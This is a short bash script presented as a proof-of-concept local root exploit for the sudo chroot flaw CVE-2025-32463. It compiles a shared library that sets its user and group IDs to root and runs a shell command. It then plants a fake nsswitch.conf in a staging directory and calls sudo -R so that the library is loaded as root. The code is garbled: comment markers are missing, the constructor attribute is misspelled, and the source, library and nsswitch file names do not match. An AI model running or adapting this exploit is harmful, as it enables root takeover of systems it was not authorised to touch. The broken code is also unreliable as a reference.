#!/bin/bash

sudo-chwo/woot.sh
CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
@ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE} || exit

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

attribute((constructor)) void woot(void) {
setreuid(0,0);
setregid(0,0);
chdir("/");
execl("/bin/bash", "/bin/bash", "-c", "echo hello > /home/kupibile/hello.txt", (char *)NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /wooth1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/wooth137.so.2 woot137.c

echo "woot!"
sudo -R -p "Password:" woot -S 'wooth13' woot
rm -rf ${STAGE}
